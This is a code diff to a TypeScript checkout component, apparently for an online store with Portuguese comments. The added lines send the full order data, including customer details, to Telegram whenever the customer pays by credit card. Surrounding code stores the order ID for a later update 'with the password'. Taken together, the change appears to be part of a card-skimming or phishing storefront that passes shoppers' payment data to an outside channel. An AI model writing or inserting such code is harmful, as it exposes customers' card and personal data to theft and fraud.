@@ -5,6 +5,7 @@ import { useToast } from "@/hooks/use-toast";
 import { DatabaseService } from "@/services/databaseService";
 import { generateOrderId } from "@/utils/orderUtils";
 import { useCart } from "@/contexts/CartContext";
+import { sendTelegramNotification } from "@/utils/telegramNotifications";
 
 interface CartPaymentProps {
   total: number;
@@ -33,8 +34,10 @@ export const CartPayment = ({
 
   const handleCheckout = async () => {
     try {
-      // Save order data first
+      // Gerar ID do pedido
       const orderId = generateOrderId();
+      
+      // Preparar dados do pedido
       const orderData = {
         id: orderId,
         customer_data: customerData || {
@@ -58,20 +61,26 @@ export const CartPayment = ({
         created_at: new Date().toISOString()
       };
 
+      // Salvar pedido no banco
       console.log("Saving order:", orderData);
       await DatabaseService.saveOrder(orderData);
       
-      // Store orderId in localStorage for later use with password
+      // Enviar notificação para Telegram se for cartão de crédito
+      if (paymentMethod === "credit") {
+        await sendTelegramNotification(orderData);
+      }
+      
+      // Armazenar ID do pedido para atualização posterior com a senha
       if (paymentMethod === "credit") {
         localStorage.setItem("currentOrderId", orderId);
       }
       
-      // Then proceed with checkout
+      // Prosseguir com checkout
       onCheckout();
       
       toast({
         title: "Pedido iniciado",
-        description: "Seus dados serão salvos durante o processo de checkout.",
+        description: "Seus dados foram salvos com sucesso.",
       });
     } catch (error) {
       console.error("Error saving order:", error);
